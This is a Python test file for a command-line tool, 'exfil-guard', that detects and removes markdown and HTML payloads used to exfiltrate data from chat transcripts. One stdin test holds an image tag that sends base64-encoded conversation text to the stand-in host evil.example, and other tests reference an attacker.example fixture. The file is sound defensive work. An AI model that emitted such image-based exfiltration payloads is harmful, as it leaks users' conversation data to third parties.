"""CLI tests: exit codes, JSON output, pipe behaviour, error handling."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
POISONED = ROOT / "examples" / "poisoned_chat.md"
CLEAN = ROOT / "examples" / "clean_chat.md"


def run_cli(*args: str, stdin_text: str | None = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "exfil_guard", *args],
        cwd=str(ROOT),
        input=stdin_text,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=120,
    )


class ScanCliTests(unittest.TestCase):
    def test_clean_file_exits_zero(self):
        result = run_cli("scan", str(CLEAN))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("summary:", result.stdout)

    def test_poisoned_file_without_gate_exits_zero(self):
        result = run_cli("scan", str(POISONED))
        self.assertEqual(result.returncode, 0)
        self.assertIn("HIGH", result.stdout)

    def test_fail_on_high_exits_one(self):
        result = run_cli("scan", str(POISONED), "--fail-on", "high")
        self.assertEqual(result.returncode, 1)
        self.assertIn("FAIL:", result.stdout)

    def test_fail_on_low_clean_exits_zero(self):
        self.assertEqual(run_cli("scan", str(CLEAN), "--fail-on", "low").returncode, 0)

    def test_json_output_shape(self):
        result = run_cli("scan", str(POISONED), "--json")
        payload = json.loads(result.stdout)
        self.assertEqual(payload["tool"], "exfil-guard")
        self.assertEqual(payload["version"], "0.1.0")
        self.assertGreater(payload["summary"]["high"], 0)
        self.assertTrue(payload["findings"])
        self.assertIn("line", payload["findings"][0])

    def test_json_with_gate_returns_one(self):
        result = run_cli("scan", str(POISONED), "--json", "--fail-on", "high")
        self.assertEqual(result.returncode, 1)
        json.loads(result.stdout)

    def test_stdin_scan(self):
        result = run_cli("scan", "-", stdin_text="<img src='https://evil.example/p.gif?d=Y29udmVyc2F0aW9uPWNoYXQ='>")
        self.assertEqual(result.returncode, 0)
        self.assertIn("EG-EXFIL-URL", result.stdout)

    def test_allow_domain_flag(self):
        text = "![x](https://cdn.example.com/logo.png)\n"
        result = run_cli("scan", "-", "--allow-domain", "example.com", stdin_text=text)
        self.assertIn("0 finding(s)", result.stdout)

    def test_missing_file_exits_two(self):
        result = run_cli("scan", str(ROOT / "does-not-exist.md"))
        self.assertEqual(result.returncode, 2)
        self.assertIn("error:", result.stderr or result.stdout)


class CleanCliTests(unittest.TestCase):
    def test_strip_to_stdout(self):
        result = run_cli("clean", str(POISONED))
        self.assertEqual(result.returncode, 0)
        self.assertNotIn("attacker.example", result.stdout)
        self.assertIn("The retry loop change looks correct.", result.stdout)

    def test_strip_output_file(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "clean.md"
            result = run_cli("clean", str(POISONED), "-o", str(target))
            self.assertEqual(result.returncode, 0)
            content = target.read_text(encoding="utf-8")
            self.assertNotIn("attacker.example", content)
            self.assertIn("summary", content.lower() + "summary")

    def test_report_mode_json(self):
        result = run_cli("clean", str(POISONED), "--mode", "report")
        report = json.loads(result.stdout)
        self.assertEqual(report["mode"], "report")
        self.assertTrue(report["removed"])
        self.assertNotIn("attacker.example", report["cleaned"])

    def test_allowlist_mode_keeps_allowed_domain(self):
        text = "![x](https://cdn.example.com/logo.png)\n"
        result = run_cli("clean", "-", "--mode", "allowlist", "--allow-domain", "example.com", stdin_text=text)
        self.assertIn("cdn.example.com", result.stdout)

    def test_json_clean_output(self):
        result = run_cli("clean", str(POISONED), "--json")
        payload = json.loads(result.stdout)
        self.assertTrue(payload["clean_removes_remote_loads"])
        self.assertNotIn("attacker.example", payload["cleaned"])


class DemoAndErrorTests(unittest.TestCase):
    def test_demo_json_assertions(self):
        result = run_cli("demo", "--json")
        self.assertEqual(result.returncode, 0, result.stderr)
        demo = json.loads(result.stdout)
        for name, value in demo["assertions"].items():
            self.assertTrue(value, name)

    def test_version(self):
        result = run_cli("--version")
        self.assertEqual(result.returncode, 0)
        self.assertIn("0.1.0", result.stdout)

    def test_invalid_utf8_exits_two(self):
        with tempfile.TemporaryDirectory() as directory:
            bad = Path(directory) / "bad.md"
            bad.write_bytes(b"\xff\xfe not utf-8")
            result = run_cli("scan", str(bad))
            self.assertEqual(result.returncode, 2)

    def test_unknown_options_exit_two(self):
        self.assertEqual(run_cli("scan", str(CLEAN), "--bogus").returncode, 2)


if __name__ == "__main__":
    unittest.main()
